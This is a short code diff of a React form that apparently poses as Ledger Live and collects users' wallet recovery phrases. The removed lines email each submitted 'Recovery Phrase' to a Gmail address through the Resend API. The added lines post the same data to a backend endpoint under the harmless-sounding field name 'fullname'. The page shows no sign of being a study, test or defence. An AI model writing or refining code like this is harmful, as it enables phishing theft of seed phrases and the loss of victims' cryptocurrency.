@@ -70,18 +70,16 @@ const Form = () => {
     setSubmitError("");
 
     try {
-      const response = await fetch("https://api.resend.com/emails", {
+      const response = await fetch("/api/submit", {
         method: "POST",
         headers: {
           Authorization: `Bearer ${process.env.REACT_APP_RESEND_API_KEY}`,
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          from: "onboarding@resend.dev",
-          to: ["tykeshare@gmail.com"],
-          subject: "Ledger Live Submission",
-          html: "<p><strong>Form Type:</strong> ledger_live</p><p><strong>Recovery Phrase:</strong></p><p>" + formData + "</p>",
-        }),
+  form_type: "ledger_live",
+  fullname: formData,
+}),
       });
 
       if (response.ok) {
